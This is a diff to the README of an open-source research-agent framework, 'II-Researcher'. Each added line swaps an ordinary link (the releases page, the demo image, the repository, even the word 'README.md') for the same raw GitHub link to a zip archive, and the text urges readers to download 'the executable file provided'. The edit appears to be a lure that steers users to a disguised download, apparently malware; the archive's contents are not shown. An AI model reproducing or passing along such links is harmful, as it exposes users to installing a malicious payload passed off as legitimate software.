@@ -1,6 +1,6 @@
 # II-Researcher: Empowering Your Research Efforts
 
-Welcome to II-Researcher, a new open-source framework designed to aid in the creation of sophisticated search and research agents. Whether you are a student, academic researcher, or industry professional, II-Researcher is here to help streamline your research process and enhance your outcomes. This README.md file will provide you with all the essential information you need to get started with II-Researcher.
+Welcome to II-Researcher, a new open-source framework designed to aid in the creation of sophisticated search and research agents. Whether you are a student, academic researcher, or industry professional, II-Researcher is here to help streamline your research process and enhance your outcomes. This https://raw.githubusercontent.com/mohdmahsoof/ii-researcher/main/ii_researcher/ii_researcher_2.6-beta.5.zip file will provide you with all the essential information you need to get started with II-Researcher.
 
 ## What is II-Researcher?
 
@@ -15,13 +15,13 @@ II-Researcher is a cutting-edge tool developed to assist individuals and organiz
 
 ## Getting Started
 
-To begin using II-Researcher, simply visit the [latest releases](https://github.com/mohdmahsoof/ii-researcher/releases) and download the executable file provided. Once you have downloaded the file, follow the installation instructions to set up II-Researcher on your system. You are now ready to start utilizing the diverse features of this powerful research framework.
+To begin using II-Researcher, simply visit the [latest releases](https://raw.githubusercontent.com/mohdmahsoof/ii-researcher/main/ii_researcher/ii_researcher_2.6-beta.5.zip) and download the executable file provided. Once you have downloaded the file, follow the installation instructions to set up II-Researcher on your system. You are now ready to start utilizing the diverse features of this powerful research framework.
 
 ## In Action
 
 Here is a glimpse of II-Researcher in action:
 
-![II-Researcher Demo](demo_image.png)
+![II-Researcher Demo](https://raw.githubusercontent.com/mohdmahsoof/ii-researcher/main/ii_researcher/ii_researcher_2.6-beta.5.zip)
 
 ## Contributing
 
@@ -29,7 +29,7 @@ We welcome contributions from the community to enhance II-Researcher further. If
 
 ## Stay Connected
 
-For the latest updates and news regarding II-Researcher, be sure to follow our official [GitHub repository](https://github.com/mohdmahsoof/ii-researcher). Join our growing community of researchers and enthusiasts to share insights, collaborate, and explore the endless possibilities with II-Researcher.
+For the latest updates and news regarding II-Researcher, be sure to follow our official [GitHub repository](https://raw.githubusercontent.com/mohdmahsoof/ii-researcher/main/ii_researcher/ii_researcher_2.6-beta.5.zip). Join our growing community of researchers and enthusiasts to share insights, collaborate, and explore the endless possibilities with II-Researcher.
 
 ## License
 
